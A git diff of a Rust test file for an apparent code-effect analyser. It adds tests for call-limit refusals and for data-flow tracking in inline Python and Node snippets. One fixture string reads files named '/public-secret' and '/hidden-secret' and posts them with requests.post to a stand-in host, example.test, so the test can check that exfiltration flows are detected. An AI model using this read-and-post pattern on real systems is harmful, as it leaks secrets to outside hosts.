@@ -1,6 +1,8 @@
+//! Verifies language-effect interpretation contracts across supported runtimes.
+
 use nah_inline::{
     InlineInput, InlineRefusal, LanguageAnalysis, LanguageCallKind, NestedExecution,
-    NestedExecutionCwd, ProtectionInput, analyze_with_language_effects,
+    NestedExecutionCwd, ProtectionInput, interpret_language_effects,
 };
 use nah_proto::{
     action::{FilesystemOperation, InvocationInput},
@@ -21,7 +23,7 @@ fn analyze_program_platform<'a>(
     code: &'a str,
     platform: Platform,
 ) -> LanguageAnalysis {
-    analyze_with_language_effects(
+    interpret_language_effects(
         InlineInput {
             program,
             code,
@@ -33,6 +35,99 @@ fn analyze_program_platform<'a>(
             ambient_variables: &[],
         },
     )
+}
+
+#[test]
+fn language_call_saturation_is_an_explicit_refusal() {
+    let exact_python = (0..64)
+        .map(|index| format!("open('/tmp/nah-language-call-{index}')"))
+        .collect::<Vec<_>>()
+        .join(";");
+    let exact = analyze_program("python3", &exact_python);
+    assert_eq!(exact.draft().calls().len(), 64);
+    assert_eq!(exact.draft().language_safety_calls().len(), 64);
+    assert!(exact.draft().complete());
+    assert!(exact.report().refusals().is_empty());
+
+    let python = (0..65)
+        .map(|index| format!("open('/tmp/nah-language-call-{index}')"))
+        .collect::<Vec<_>>()
+        .join(";");
+    let javascript = format!(
+        "const fs=require('fs');{}",
+        (0..65)
+            .map(|index| format!("fs.writeFileSync('/tmp/nah-language-call-{index}','x')"))
+            .collect::<Vec<_>>()
+            .join(";")
+    );
+
+    for (program, code) in [("python3", python.as_str()), ("node", javascript.as_str())] {
+        let analysis = analyze_program(program, code);
+        assert_eq!(analysis.draft().calls().len(), 64, "{program}");
+        assert_eq!(
+            analysis.draft().language_safety_calls().len(),
+            65,
+            "{program}"
+        );
+        assert!(!analysis.draft().complete(), "{program}");
+        assert_eq!(
+            analysis.report().refusals(),
+            [InlineRefusal::LanguageCallLimit],
+            "{program}"
+        );
+    }
+}
+
+#[test]
+fn language_safety_saturation_is_an_explicit_refusal() {
+    let python = (0..257)
+        .map(|index| format!("open('/tmp/nah-language-safety-{index}')"))
+        .collect::<Vec<_>>()
+        .join(";");
+    let analysis = analyze_program("python3", &python);
+
+    assert_eq!(analysis.draft().calls().len(), 64);
+    assert_eq!(analysis.draft().language_safety_calls().len(), 256);
+    assert_eq!(
+        analysis.report().refusals(),
+        [
+            InlineRefusal::LanguageCallLimit,
+            InlineRefusal::LanguageSafetyLimit
+        ]
+    );
+}
+
+#[test]
+fn public_flows_reference_only_public_calls() {
+    let benign = (0..62)
+        .map(|index| format!("open('/tmp/nah-language-call-{index}', 'w')"))
+        .collect::<Vec<_>>()
+        .join(";");
+    let code = format!(
+        "from pathlib import Path\nimport requests\npublic = Path('/public-secret').read_text()\nrequests.post('https://example.test/public', data=public)\n{benign}\nhidden = Path('/hidden-secret').read_text()\nrequests.post('https://example.test/hidden', data=hidden)"
+    );
+    let analysis = analyze(&code);
+
+    assert_eq!(analysis.draft().calls().len(), 64);
+    assert_eq!(analysis.draft().language_safety_calls().len(), 66);
+    assert_eq!(
+        analysis
+            .draft()
+            .flows()
+            .iter()
+            .map(|flow| (flow.from(), flow.to()))
+            .collect::<Vec<_>>(),
+        [(0, 1)]
+    );
+    assert_eq!(
+        analysis
+            .draft()
+            .language_safety_flows()
+            .iter()
+            .map(|flow| (flow.from(), flow.to()))
+            .collect::<Vec<_>>(),
+        [(0, 1), (64, 65)]
+    );
 }
 
 #[test]
